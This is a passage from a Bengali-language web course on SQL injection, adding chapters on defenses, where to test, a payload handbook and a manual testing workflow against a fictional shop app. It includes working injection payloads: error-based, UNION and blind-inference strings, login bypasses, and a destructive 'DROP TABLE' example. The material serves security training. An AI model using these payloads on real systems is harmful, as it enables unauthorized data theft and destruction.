+  <p>Database connection string/credential environment variable বা secret manager-এ রাখা উচিত, কোডে hardcode নয় — যদি SQLi দিয়ে source code-এর অংশ ফাঁস হয়েও যায়, তাহলেও credential উন্মুক্ত হবে না। এছাড়া অস্বাভাবিক query pattern (যেমন একই IP থেকে বারবার <code>UNION SELECT</code>-জাতীয় input) মনিটর করার জন্য logging ও alerting রাখা উচিত।</p>
+
+  <h2>Regression Testing ও Secure Code Review</h2>
+  <p>প্রতিটি নতুন ফিচার যা database query তৈরি করে, তার জন্য automated static analysis (SAST) টুল এবং manual code review-তে নির্দিষ্টভাবে "এই query কি parameterized?" যাচাই করা উচিত। CI/CD pipeline-এ SQLi-নির্দিষ্ট regression টেস্ট (যেমন পরিচিত payload দিয়ে automated scan) যোগ করা যেতে পারে।</p>
+
+  <h3>Developer Checklist</h3>
+  <div class="card">
+    <ul>
+      <li>☐ সব database query parameterized/prepared statement দিয়ে তৈরি হচ্ছে কি?</li>
+      <li>☐ কোথাও raw/dynamic SQL string concatenation আছে কি না খুঁজে দেখা হয়েছে?</li>
+      <li>☐ Dynamic column/table name allowlist দিয়ে সীমাবদ্ধ করা হয়েছে?</li>
+      <li>☐ Database account least-privilege নীতিতে কনফিগার করা?</li>
+      <li>☐ Production-এ verbose error message বন্ধ?</li>
+      <li>☐ ORM-এর raw query অংশগুলো আলাদাভাবে review করা হয়েছে?</li>
+      <li>☐ Input validation defense-in-depth হিসেবে আছে (কিন্তু একমাত্র সুরক্ষা নয়)?</li>
+    </ul>
+  </div>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>উপরের যেকোনো একটি ভাষার vulnerable কোড নিজে পুনরায় লিখে fixed ভার্সনে রূপান্তর করুন, তারপর ব্যাখ্যা করুন ঠিক কোন লাইনটি পরিবর্তনের ফলে injection সম্ভব না হওয়ার মূল কারণ।</p>
+  </div>
+
+  <div class="summary-box">
+    <h4>সারসংক্ষেপ</h4>
+    <p>Parameterized query/prepared statement হলো SQLi প্রতিরোধের মূল ভিত্তি, কিন্তু এটি dynamic identifier-কে সুরক্ষা দেয় না — তার জন্য allowlist দরকার। Input validation, least-privilege account, safe error handling, ও secure code review একসাথে defense-in-depth তৈরি করে।</p>
+  </div>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Parameterized query কীভাবে input ও code-কে আলাদা রাখে — কারিগরি ব্যাখ্যা দিন।</li>
+      <li>ORM ব্যবহার করলেও কেন SQLi সম্ভব হতে পারে?</li>
+      <li>Dynamic ORDER BY কলাম কেন parameter হিসেবে bind করা যায় না?</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter03"><span>পূর্ববর্তী</span>অধ্যায় ০৩</a>
+    <a class="next" href="/chapter18"><span>পরবর্তী</span>অধ্যায় ১৮ — False Positives (শীঘ্রই)</a>
+  </div>
+</section>
+
+
+<section class="chapter" id="ch04">
+  <div class="eyebrow">অধ্যায় ০৪ · টেস্টিং</div>
+  <h1>SQL Injection কোথায় Test করতে হয়</h1>
+  <p class="sub">বাস্তব ওয়েব অ্যাপ্লিকেশন ও API-তে কোথায় user-controlled input থাকে, এবং প্রতিটি জায়গায় কীভাবে হাইপোথিসিস তৈরি করে টেস্ট করতে হয়।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch04" id="done-ch04"><label for="done-ch04">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <div class="callout warn"><div class="ic">🧪</div><p>কোনো একটি payload বা টেকনিক সব জায়গায় কাজ করবে — এমন কোনো নিশ্চয়তা নেই। প্রতিটি ক্ষেত্রে আলাদাভাবে hypothesis তৈরি করে, baseline-এর সাথে তুলনা করে সিদ্ধান্ত নিতে হবে। নিচের সব উদাহরণ ShopMock নামের fictional অ্যাপ্লিকেশনের উপর ভিত্তি করে।</p></div>
+
+  <h2>সাধারণ পদ্ধতি — প্রতিটি জায়গার জন্য</h2>
+  <ol>
+    <li><strong>Input শনাক্ত করা:</strong> কোন parameter, field, header বা cookie ইউজার নিয়ন্ত্রণ করতে পারে তা চিহ্নিত করুন।</li>
+    <li><strong>Hypothesis তৈরি:</strong> অনুমান করুন এই input ব্যাকএন্ডে কী ধরনের query তৈরি করতে পারে (numeric filter, string match, sorting ইত্যাদি)।</li>
+    <li><strong>Burp Suite দিয়ে request inspect:</strong> Proxy দিয়ে অনুরোধ ক্যাপচার করে প্রতিটি parameter দেখুন — কোনটি স্পষ্টতই ডেটাবেসে ব্যবহৃত হচ্ছে বলে মনে হয়।</li>
+    <li><strong>Baseline তৈরি:</strong> একটি স্বাভাবিক request পাঠিয়ে তার response (status, length, content) রেকর্ড করুন।</li>
+    <li><strong>Test response তুলনা:</strong> একটি single-character probe (<code>'</code>) পাঠিয়ে baseline-এর সাথে পার্থক্য আছে কি না দেখুন।</li>
+  </ol>
+
+  <h2>Input-এর ক্ষেত্রসমূহ</h2>
+
+  <h3>১. Login ও Registration Form</h3>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>POST /login
+username=alamin&password=Secret123</code></pre></div>
+  <p><strong>User-controlled:</strong> username, password উভয়ই। <strong>Hypothesis:</strong> ব্যাকএন্ড সম্ভবত <code>SELECT * FROM users WHERE username='...' AND password='...'</code> টাইপ query চালায়। <strong>সম্ভাবনা বেশি কখন:</strong> যদি ভুল পাসওয়ার্ডের জন্য আলাদা error message এবং ভুল username-এর জন্য আলাদা message দেখা যায় (username enumeration), তাহলে query username/password আলাদাভাবে চেক করছে — testing surface স্পষ্ট হয়। <strong>Vulnerability-এর প্রমাণ নয়:</strong> শুধু "Invalid credentials" বার্তা আসা মানেই injection নেই তা প্রমাণ করে না, আবার সেটা থাকা মানেই injection আছে তাও প্রমাণ করে না।</p>
+
+  <h3>২. Search Box</h3>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>GET /search?q=laptop</code></pre></div>
+  <p><strong>Hypothesis:</strong> প্রায়ই <code>LIKE</code> ক্লজ ব্যবহার হয়: <code>WHERE name LIKE '%laptop%'</code>। এখানে quote escape করার পাশাপাশি <code>%</code> ওয়াইল্ডকার্ডও বিবেচনা করা দরকার। <strong>সম্ভাবনা বেশি:</strong> Search ফিচার প্রায়ই string concatenation দিয়ে দ্রুত implement করা হয়, তাই এটি একটি উচ্চ-অগ্রাধিকার টেস্ট পয়েন্ট।</p>
+
+  <h3>৩. Product ID ও Category ID</h3>
+  <div class="codeblock"><pre><code>GET /product?id=42
+GET /category?cat=5</code></pre></div>
+  <p><strong>Hypothesis:</strong> numeric context — <code>WHERE id = 42</code> (quote ছাড়া)। <strong>টেস্ট:</strong> <code>id=42'</code> (quote) এবং <code>id=42 AND 1=1</code>/<code>id=42 AND 1=2</code> উভয়ই চেষ্টা করুন, কারণ numeric parameter কখনো কখনো backend-এ string হিসেবেও handle হতে পারে।</p>
+
+  <h3>৪. URL Query Parameter ও POST Form Field</h3>
+  <p>যেকোনো <code>?key=value</code> বা form field সম্ভাব্য ইনপুট পয়েন্ট — এমনকি যেগুলো UI-তে দেখা যায় না (hidden field) সেগুলোও। Burp-এর HTTP history-তে প্রতিটি parameter তালিকাভুক্ত করে একে একে পরীক্ষা করুন।</p>
+
+  <h3>৫. JSON Request Body / REST API / GraphQL</h3>
+  <div class="codeblock"><div class="cb-head"><span>JSON body উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>POST /api/orders
+Content-Type: application/json
+
+{"product_id": 42, "quantity": 2, "coupon": "SAVE10"}</code></pre></div>
+  <p><strong>Hypothesis:</strong> প্রতিটি JSON key আলাদাভাবে ব্যাকএন্ডে ব্যবহার হতে পারে। <code>coupon</code>-এর মতো string field একটি lookup query ট্রিগার করতে পারে। GraphQL-এ resolver-level-এ আর্গুমেন্ট (যেমন <code>filter: {name: "x"}</code>) একইভাবে পরীক্ষা করা উচিত — অধ্যায় ১৪-এ বিস্তারিত।</p>
+
+  <h3>৬. Cookies ও HTTP Headers</h3>
+  <p>যদি অ্যাপ্লিকেশন <code>User-Agent</code>, <code>X-Forwarded-For</code>, বা একটি কাস্টম cookie কোনো লগিং বা personalization query-তে ব্যবহার করে (যেমন "এই ব্রাউজার থেকে শেষ ভিজিট" track করা), তাহলে এগুলোও user-controlled input — attacker সহজেই Burp Repeater দিয়ে এই মানগুলো পরিবর্তন করতে পারে।</p>
+
+  <h3>৭. Sorting, Filtering, Pagination (limit/offset)</h3>
+  <div class="codeblock"><pre><code>GET /products?sort=price&order=asc&page=2&limit=20</code></pre></div>
+  <p><strong>Hypothesis:</strong> <code>sort</code>/<code>order</code> প্রায়ই সরাসরি <code>ORDER BY</code> ক্লজে বসে (identifier context — আলাদা payload দরকার, অধ্যায় ০৩-এর "ORDER BY ক্লজ ইনজেকশন" দেখুন); <code>limit</code>/<code>offset</code> numeric context। এই প্যারামিটারগুলো প্রায়ই developer-রা "শুধু UI নিয়ন্ত্রণ করে" ভেবে কম সতর্কতার সাথে handle করেন — তাই বাস্তবে এখানে vulnerability পাওয়ার সম্ভাবনা তুলনামূলক বেশি।</p>
+
+  <h3>৮. User Profile ও Account Settings</h3>
+  <p>প্রোফাইল আপডেট ফর্ম (নাম, ঠিকানা, বায়ো) প্রায়ই একটি <code>UPDATE</code> query ট্রিগার করে। যদিও <code>UPDATE</code>-ভিত্তিক injection সাধারণত blind হয় (কোনো ডেটা সরাসরি response-এ আসে না), তবুও boolean/time-based টেকনিক এখানে কার্যকর হতে পারে।</p>
+
+  <h3>৯. Order History ও Product Filtering, Report/Export</h3>
+  <p>Export ফিচার (যেমন CSV/PDF রিপোর্ট জেনারেশন) প্রায়ই জটিল, multi-filter query ব্যবহার করে যা ডেভেলপার কম টেস্ট করেন — তাই এগুলো উচ্চ-অগ্রাধিকার টার্গেট।</p>
+
+  <h3>১০. File Metadata ও Database-backed Upload Workflow</h3>
+  <p>ফাইল আপলোডের সময় filename, metadata (যেমন EXIF ট্যাগ) যদি ডেটাবেসে সংরক্ষণের আগে query-তে ব্যবহৃত হয় (যেমন duplicate filename চেক করতে), তাহলে filename নিজেই একটি injection vector হতে পারে।</p>
+
+  <h3>১১. Hidden Form Field ও Multi-Step Workflow (Second-Order)</h3>
+  <p>একটি multi-step checkout-এ ধাপ ১-এ দেওয়া ডেটা ধাপ ৩-এ ভিন্ন একটি query-তে ব্যবহৃত হতে পারে — এটি second-order SQLi-এর সম্ভাব্য ক্ষেত্র (অধ্যায় ০৩ দেখুন)। Hidden field-এর মান DOM-এ দেখা গেলেও, Burp দিয়ে request intercept করে সরাসরি পরিবর্তন করা সম্ভব।</p>
+
+  <h3>১২. Admin Panel (শুধুমাত্র অনুমোদিত টেস্টিং-এ)</h3>
+  <p>Admin panel-এ সাধারণত বেশি জটিল filtering/reporting ফিচার থাকে এবং কম ব্যবহারকারীর দ্বারা টেস্ট হয় বলে ঝুঁকি বেশি থাকতে পারে — কিন্তু এখানে টেস্টিং শুধুমাত্র তখনই করা উচিত যখন scope-এ স্পষ্টভাবে admin-level access অনুমোদিত।</p>
+
+  <h2>কোথায় সম্ভাবনা বেশি, কোথায় কম</h2>
+  <table>
+    <thead><tr><th>বেশি সম্ভাবনা</th><th>কম সম্ভাবনা (কিন্তু শূন্য নয়)</th></tr></thead>
+    <tbody>
+      <tr><td>Search, sort, filter, export, legacy endpoint</td><td>ORM-ভিত্তিক আধুনিক CRUD endpoint (তবে raw query অংশ থাকলে ঝুঁকিপূর্ণ)</td></tr>
+      <tr><td>Internal/admin reporting টুল</td><td>হাই-ট্রাফিক, বহুবার security-reviewed পাবলিক endpoint</td></tr>
+      <tr><td>সম্প্রতি যোগ হওয়া বা কম-ব্যবহৃত ফিচার</td><td>Framework-generated standard CRUD যেখানে কাস্টম SQL নেই</td></tr>
+    </tbody>
+  </table>
+
+  <h2>কোন ফলাফল Vulnerability-এর প্রমাণ নয়</h2>
+  <ul>
+    <li>একটি generic HTTP ৪০০/৫০০ error (কোনো SQL-নির্দিষ্ট তথ্য ছাড়া)।</li>
+    <li>Response সময় সামান্য ভিন্ন হওয়া (নেটওয়ার্ক শব্দ হতে পারে) — বারবার পরীক্ষা না করে সিদ্ধান্ত নেওয়া যাবে না।</li>
+    <li>Input reflect হওয়া (response-এ ফিরে আসা) — এটি XSS-সম্পর্কিত হতে পারে, SQLi নয়।</li>
+  </ul>
+
+  <div class="exercise">
+    <h4>অনুশীলন</h4>
+    <p>একটি authorized lab অ্যাপ্লিকেশনে (যেমন PortSwigger Web Security Academy) গিয়ে, Burp Proxy চালু করে, একটি সার্চ ফিচারের সব HTTP parameter তালিকাভুক্ত করুন এবং প্রতিটির জন্য একটি hypothesis লিখুন — ব্যাকএন্ডে এটি numeric না string context-এ ব্যবহৃত হতে পারে বলে মনে হয়।</p>
+  </div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>User-controlled input শুধু visible form field নয় — URL parameter, JSON body, cookie, header, sorting/pagination parameter, এমনকি file metadata-ও সম্ভাব্য injection point। প্রতিটি ক্ষেত্রে আলাদা hypothesis তৈরি করে, baseline-এর সাথে তুলনা করে পরীক্ষা করা জরুরি — কোনো universal payload বা স্থান নেই যেখানে সবসময় vulnerability থাকবে।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>Sorting parameter কেন সাধারণত বেশি ঝুঁকিপূর্ণ হতে পারে?</li>
+    <li>Second-order SQLi শনাক্ত করতে multi-step workflow কেন বিশেষভাবে পরীক্ষা করা দরকার?</li>
+    <li>Response reflect হওয়া কেন SQLi-এর প্রমাণ নয়?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter03"><span>পূর্ববর্তী</span>অধ্যায় ০৩</a>
+    <a class="next" href="/chapter05"><span>পরবর্তী</span>অধ্যায় ০৫ — Payload Handbook</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch05">
+  <div class="eyebrow">অধ্যায় ০৫ · টেস্টিং</div>
+  <h1>SQL Injection Payload Handbook</h1>
+  <p class="sub">Categorized payload রেফারেন্স — প্রতিটির উদ্দেশ্য, database dependency, expected observation ও সীমাবদ্ধতা সহ।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch05" id="done-ch05"><label for="done-ch05">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <div class="callout danger"><div class="ic">⛔</div><p>এখানে কোনো payload "universal" নয়। প্রতিটি payload-এর কার্যকারিতা database engine, query context (string/numeric/identifier) এবং application-এর error-handling আচরণের উপর নির্ভরশীল। শুধুমাত্র নিজের lab বা অনুমোদিত target-এ ব্যবহার করুন।</p></div>
+
+  <h2>১. Basic Syntax Probe</h2>
+  <div class="codeblock"><div class="cb-head"><span>উদ্দেশ্য: input query-তে পৌঁছাচ্ছে কি না যাচাই</span><button class="copy-btn">কপি</button></div><pre><code>'
+"
+`
+)
+))
+;</code></pre></div>
+  <p><strong>Database dependency:</strong> সব relational DB-তে প্রযোজ্য, কিন্তু কোন character ব্যবহার হবে তা context-নির্ভর (string context-এ quote, function call-এর ভেতরে থাকলে parenthesis)। <strong>Expected observation:</strong> error message, HTTP status পরিবর্তন, বা response length-এ পার্থক্য। <strong>সীমাবদ্ধতা:</strong> input sanitize/escape হলে কোনো প্রভাব দেখা যাবে না — এটি শুধু প্রাথমিক সংকেত, নিশ্চিত প্রমাণ নয়।</p>
+
+  <h2>২. Single-Quote ও Double-Quote Test</h2>
+  <div class="codeblock"><pre><code>Original: id=7
+Test:     id=7'
+Test:     id=7"
+Test:     id=7\'   (escaped quote, WAF/filter bypass পরীক্ষার জন্য)</code></pre></div>
+  <p>MySQL ও PostgreSQL-এ string literal সাধারণত single quote দিয়ে ঘেরা থাকে; MSSQL-এও তাই। Double quote কিছু DB-তে (PostgreSQL, Oracle) identifier (কলাম/টেবিল নাম) বোঝাতে ব্যবহৃত হয়, string-এর জন্য নয় — তাই DB অনুযায়ী ফলাফল ভিন্ন হতে পারে।</p>
+
+  <h2>৩. Parentheses ও Context Test</h2>
+  <div class="codeblock"><pre><code>id=(7)
+id=7)
+id=7))</code></pre></div>
+  <p>যদি input কোনো function call-এর আর্গুমেন্ট হিসেবে ব্যবহৃত হয় (যেমন <code>WHERE id IN (SELECT ... WHERE x = (7))</code>), তাহলে অতিরিক্ত বা কম closing parenthesis দিয়ে ঠিক কয়টি nested level আছে তা অনুমান করা যায়।</p>
+
+  <h2>৪. Numeric Input Test</h2>
+  <div class="codeblock"><pre><code>id=7 AND 1=1
+id=7 AND 1=2
+id=7+0
+id=7-0
+id=7 OR 1=1</code></pre></div>
+  <p><strong>Expected:</strong> <code>AND 1=1</code> স্বাভাবিক ফলাফল দেখানো উচিত (কারণ শর্ত true), <code>AND 1=2</code>-এ ফলাফল না আসা উচিত (শর্ত false) — এই পার্থক্যই injection-এর ইঙ্গিত। <code>id=7+0</code> গাণিতিকভাবে ৭-এর সমান ফলাফল দিলে বোঝা যায় input arithmetic context-এ parse হচ্ছে (অর্থাৎ ইনজেকশনের সুযোগ আছে), কিন্তু যদি ভিন্ন ফলাফল আসে (বা error) তাহলে সরাসরি string হিসেবে ট্রিট হচ্ছে বলে মনে হতে পারে।</p>
+
+  <h2>৫. Boolean True/False Comparison</h2>
+  <div class="codeblock"><pre><code>' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+1 AND 1=1--
+1 AND 1=2--</code></pre></div>
+  <p>এই payload গুলোর মূল উদ্দেশ্য একটি নির্ভরযোগ্য true/false চ্যানেল প্রতিষ্ঠা করা — অধ্যায় ০৩-এর "Boolean-Based Blind" সেকশনে বিস্তারিত পদ্ধতি দেওয়া আছে।</p>
+
+  <h2>৬. Error-Based Probe (Database-নির্দিষ্ট)</h2>
+  <div class="codeblock"><div class="cb-head"><span>MySQL — EXTRACTVALUE/UPDATEXML কৌশল</span><button class="copy-btn">কপি</button></div><pre><code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --</code></pre></div>
+  <p><strong>কীভাবে কাজ করে:</strong> <code>EXTRACTVALUE</code> একটি XPath function যা ভুল XPath পেলে error ছোড়ে, এবং সেই error message-এর মধ্যে সাব-কোয়েরির ফলাফল (এখানে database version) প্রদর্শিত হয় — এটি error-based SQLi-কে আরও নির্ভুলভাবে ডেটা বের করার কাজে ব্যবহার করা যায়। এটি শুধুমাত্র MySQL-এ কাজ করে এবং verbose error দেখানো হলেই কার্যকর।</p>
+
+  <h2>৭. UNION Column-Count Discovery</h2>
+  <div class="codeblock"><pre><code>ORDER BY 1--
+ORDER BY 2--
+ORDER BY N--  (error না আসা পর্যন্ত বাড়াতে থাকুন)
+
+অথবা:
+UNION SELECT NULL--
+UNION SELECT NULL,NULL--
+UNION SELECT NULL,NULL,NULL--</code></pre></div>
+  <p>বিস্তারিত পদ্ধতি অধ্যায় ০৩-এর UNION-based সেকশনে।</p>
+
+  <h2>৮. NULL-Based UNION Alignment</h2>
+  <div class="codeblock"><pre><code>UNION SELECT NULL, 'probe-marker-xyz', NULL--</code></pre></div>
+  <p><code>NULL</code> প্রায় সব data type-এর সাথে সামঞ্জস্যপূর্ণ, তাই column-count ঠিক হওয়ার পর কোন position display হয় তা বের করতে ব্যবহৃত হয়। একবার marker স্ট্রিং response-এ দেখা গেলে, সেই position-এ প্রকৃত ডেটা (যেমন username) বসানো যায়।</p>
+
+  <h2>৯. Database Fingerprinting Probe</h2>
+  <div class="codeblock"><pre><code>-- MySQL
+SELECT @@version
+
+-- PostgreSQL
+SELECT version()
+
+-- MSSQL
+SELECT @@version
+
+-- Oracle
+SELECT banner FROM v$version
+
+-- SQLite
+SELECT sqlite_version()</code></pre></div>
+  <p>পূর্ণ fingerprinting পদ্ধতি অধ্যায় ০৮-এ।</p>
+
+  <h2>১০. Blind SQLi Inference (Substring)</h2>
+  <div class="codeblock"><pre><code>AND SUBSTRING((SELECT database()),1,1)='a'
+AND ASCII(SUBSTRING((SELECT database()),1,1))>100</code></pre></div>
+  <p><code>ASCII()</code>-ভিত্তিক comparison character-by-character না করে binary-search পদ্ধতিতে (>, <) দ্রুত প্রতিটি অক্ষর বের করতে দেয় — প্রতি অক্ষরে গড়ে log₂(১২৮) ≈ ৭টি request লাগে, ১২৭টির বদলে।</p>
+
+  <h2>১১. Time-Delay Verification</h2>
+  <p>অধ্যায় ০৩-এর Time-Based Blind সেকশনে DB-নির্দিষ্ট syntax বিস্তারিত দেওয়া আছে (SLEEP, pg_sleep, WAITFOR DELAY)।</p>
+
+  <h2>১২. ORDER BY Testing</h2>
+  <div class="codeblock"><pre><code>ORDER BY 1--
+ORDER BY (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--</code></pre></div>
+  <p>যেহেতু <code>ORDER BY</code>-তে সরাসরি column reference লাগে, condition-ভিত্তিক error তৈরি করতে <code>CASE WHEN</code> ব্যবহার করে এমন একটি expression বানানো হয় যা false হলে একাধিক row ফেরত দেওয়ার চেষ্টা করে এবং error তৈরি করে (sub-query-তে একাধিক row আসলে error হয়)।</p>
+
+  <h2>১৩. Second-Order SQLi Investigation</h2>
+  <p>Payload সরাসরি response-এ প্রভাব না ফেলে প্রথমে সংরক্ষণ করুন (যেমন একটি প্রোফাইল নাম ফিল্ডে <code>O'Brien'; --</code>-জাতীয় টেক্সট সংরক্ষণ করে), এরপর সেই ডেটা যেসব ফিচার ব্যবহার করে (রিপোর্ট, সার্চ, এক্সপোর্ট) সেগুলো পরীক্ষা করে দেখুন প্রভাব দেখা যায় কি না — বিস্তারিত অধ্যায় ১৩-এ।</p>
+
+  <h2>১৪. DBMS-নির্দিষ্ট Syntax পার্থক্য</h2>
+  <table>
+    <thead><tr><th>বিষয়</th><th>MySQL</th><th>PostgreSQL</th><th>MSSQL</th><th>Oracle</th><th>SQLite</th></tr></thead>
+    <tbody>
+      <tr><td>Comment</td><td><code>-- </code> / <code>#</code></td><td><code>--</code></td><td><code>--</code></td><td><code>--</code></td><td><code>--</code></td></tr>
+      <tr><td>String concat</td><td><code>CONCAT(a,b)</code></td><td><code>a || b</code></td><td><code>a + b</code></td><td><code>a || b</code></td><td><code>a || b</code></td></tr>
+      <tr><td>Delay</td><td><code>SLEEP(5)</code></td><td><code>pg_sleep(5)</code></td><td><code>WAITFOR DELAY '0:0:5'</code></td><td><code>DBMS_LOCK.SLEEP(5)</code></td><td>নেই (native)</td></tr>
+      <tr><td>Stacked queries</td><td>সাধারণত না (ড্রাইভার-নির্ভর)</td><td>প্রায়ই হ্যাঁ</td><td>হ্যাঁ</td><td>সীমিত</td><td>ড্রাইভার-নির্ভর</td></tr>
+      <tr><td>No-table SELECT</td><td>হ্যাঁ</td><td>হ্যাঁ</td><td>হ্যাঁ</td><td>না, <code>FROM dual</code> লাগে</td><td>হ্যাঁ</td></tr>
+    </tbody>
+  </table>
+  <p>পূর্ণ fingerprinting টেবিল অধ্যায় ০৮-এ।</p>
+
+  <h2>১৫. JSON/API Testing Examples</h2>
+  <div class="codeblock"><div class="cb-head"><span>JSON body-তে payload বসানো</span><button class="copy-btn">কপি</button></div><pre><code>{"username": "alamin' OR '1'='1", "password": "x"}
+{"sort": "price; DROP TABLE orders--"}
+{"filter": {"category": "electronics' UNION SELECT NULL,NULL--"}}</code></pre></div>
+  <p>JSON-এ quote ব্যবহার করলে JSON parser-এর নিজস্ব escaping (<code>\"</code>) মাথায় রাখতে হবে — payload-এর মধ্যে single quote (JSON string-এর জন্য সমস্যা তৈরি করে না) ব্যবহার করা তুলনামূলক সহজ, কিন্তু double quote ব্যবহার করলে JSON escape (<code>\\\"</code>) করতে হবে, নইলে request-ই invalid JSON হয়ে যাবে এবং পার্স ব্যর্থ হবে।</p>
+
+  <div class="exercise"><h4>অনুশীলন</h4><p>একটি authorized lab endpoint-এ উপরের ১৫টি ক্যাটাগরি থেকে অন্তত ৫টি ভিন্ন payload চেষ্টা করুন এবং প্রতিটির জন্য baseline-এর সাথে response তুলনা করে একটি নোট লিখুন — কাজ করেছে, করেনি, নাকি অনিশ্চিত।</p></div>
+
+  <div class="summary-box"><h4>সারসংক্ষেপ</h4><p>এই handbook একটি রেফারেন্স, নির্দেশিকা নয় — প্রতিটি payload-এর পেছনের যুক্তি বুঝে, database ও context অনুযায়ী মানিয়ে ব্যবহার করতে হবে। সন্দেহ হলে সবসময় alternative explanation বিবেচনা করুন।</p></div>
+
+  <div class="qa"><h3>Knowledge-check</h3><ol>
+    <li>ASCII-ভিত্তিক binary-search inference কেন substring-এর চেয়ে দ্রুত?</li>
+    <li>JSON body-তে double quote payload ব্যবহার করলে কী সমস্যা হতে পারে?</li>
+    <li>কেন <code>FROM dual</code> শুধু Oracle-এ প্রয়োজন?</li>
+  </ol></div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter04"><span>পূর্ববর্তী</span>অধ্যায় ০৪</a>
+    <a class="next" href="/chapter06"><span>পরবর্তী</span>অধ্যায় ০৬ — Manual Testing Methodology</a>
+  </div>
+</section>
+
+<section class="chapter" id="ch06">
+  <div class="eyebrow">অধ্যায় ০৬ · টেস্টিং</div>
+  <h1>Manual SQLi Testing Methodology</h1>
+  <p class="sub">একটি repeatable, ১৫-ধাপের workflow — প্রতিটি ধাপে practical উদাহরণসহ।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch06" id="done-ch06"><label for="done-ch06">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <div class="callout warn"><div class="ic">⚠️</div><p><strong>একসাথে একাধিক parameter পরিবর্তন করবেন না।</strong> যদি একই request-এ দুটি parameter বদলান এবং response পরিবর্তিত হয়, তাহলে কোনটির জন্য পরিবর্তন হলো তা নিশ্চিতভাবে বলা যাবে না। Controlled testing মানে প্রতিবার ঠিক একটি variable বদলানো।</p></div>
+
+  <ol style="padding-right:22px">
+    <li>
+      <h3>Testing scope ও authorization যাচাই</h3>
+      <p>টেস্ট শুরুর আগে লিখিতভাবে নিশ্চিত হোন কোন ডোমেইন/endpoint scope-এ আছে, কোনটি নেই, এবং কী ধরনের টেস্টিং (active/passive, destructive/non-destructive) অনুমোদিত। Bug bounty প্রোগ্রামের ক্ষেত্রে program policy পুনরায় পড়ুন।</p>
+    </li>
+    <li>
+      <h3>Application Mapping</h3>
+      <p>পুরো অ্যাপ্লিকেশন ব্রাউজ করে (Burp Proxy চালু রেখে) একটি sitemap তৈরি করুন — কোন কোন endpoint, parameter, ফর্ম আছে তার তালিকা। এটি অধ্যায় ০৪-এর "কোথায় টেস্ট করতে হয়" তালিকার সাথে ক্রস-রেফারেন্স করুন।</p>
+    </li>
+    <li>
+      <h3>Burp Suite Proxy দিয়ে Request Capture</h3>
+      <div class="codeblock"><pre><code>GET /product?id=7 HTTP/1.1
+Host: shopmock.local
+Cookie: session=abc123</code></pre></div>
+      <p>Proxy > HTTP history-তে প্রতিটি request সংরক্ষিত থাকে — পরবর্তী বিশ্লেষণের জন্য এটি মূল উৎস।</p>
+    </li>
+    <li>
+      <h3>Repeater-এ Request পাঠানো</h3>
+      <p>টেস্ট করার মতো request-টি right-click করে "Send to Repeater"-এ পাঠান। Repeater-এ একই request বারবার, সামান্য পরিবর্তন করে পাঠানো যায় এবং response পাশাপাশি দেখা যায় — manual testing-এর মূল টুল।</p>
+    </li>
+    <li>
+      <h3>Parameters Identify করা</h3>
+      <p>URL, body, cookie, header — প্রতিটি অংশে কোন কোন value আছে তালিকা করুন। প্রতিটিকে আলাদাভাবে টেস্ট করার পরিকল্পনা করুন।</p>
+    </li>
+    <li>
+      <h3>Baseline Response তৈরি করা</h3>
+      <p>অপরিবর্তিত request পাঠিয়ে status code, response length, এবং body-এর একটি অংশ (যেমন প্রোডাক্ট নাম) নোট করুন — এটিই তুলনার ভিত্তি।</p>
+      <div class="codeblock"><pre><code>Baseline: GET /product?id=7 → 200 OK, length=4213, "Wireless Mouse"</code></pre></div>
+    </li>
+    <li>
+      <h3>একটি Parameter পরিবর্তন করে Test করা</h3>
+      <div class="codeblock"><pre><code>Test 1: id=7'          → ?
+Test 2: id=7 AND 1=1    → ?
+Test 3: id=7 AND 1=2    → ?</code></pre></div>
+      <p>প্রতিটি টেস্টের ফলাফল আলাদাভাবে রেকর্ড করুন।</p>
+    </li>
+    <li>
+      <h3>True/False Condition তুলনা</h3>
+      <p><code>AND 1=1</code> (baseline-এর মতো) বনাম <code>AND 1=2</code> (ভিন্ন) — যদি দুটোর response আলাদা হয়, এটি একটি শক্তিশালী সংকেত।</p>
+    </li>
+    <li>
+      <h3>Error ও Response Differences পর্যবেক্ষণ</h3>
+      <p>শুধু "ভিন্ন দেখাচ্ছে" বলাই যথেষ্ট না — ঠিক কোন অংশ ভিন্ন (status code? length? নির্দিষ্ট টেক্সট?) নির্দিষ্টভাবে লিখে রাখুন, যাতে পরে প্রমাণ হিসেবে ব্যবহার করা যায়।</p>
+    </li>
+    <li>
+      <h3>প্রয়োজন অনুযায়ী Timing পরীক্ষা</h3>
+      <p>যদি content-ভিত্তিক কোনো পার্থক্য না পাওয়া যায়, তাহলে time-based payload (অধ্যায় ০৩, ০৫) দিয়ে পরীক্ষা করুন — কিন্তু একাধিকবার পরিমাপ করে নিশ্চিত হোন।</p>
+    </li>
+    <li>
+      <h3>Database Fingerprinting</h3>
+      <p>Injection নিশ্চিত হলে, exploitation চালিয়ে যাওয়ার আগে database engine শনাক্ত করুন (অধ্যায় ০৮) — এটি পরবর্তী payload নির্বাচনকে সহজ করে।</p>
+    </li>
+    <li>
+      <h3>Evidence সংগ্রহ</h3>
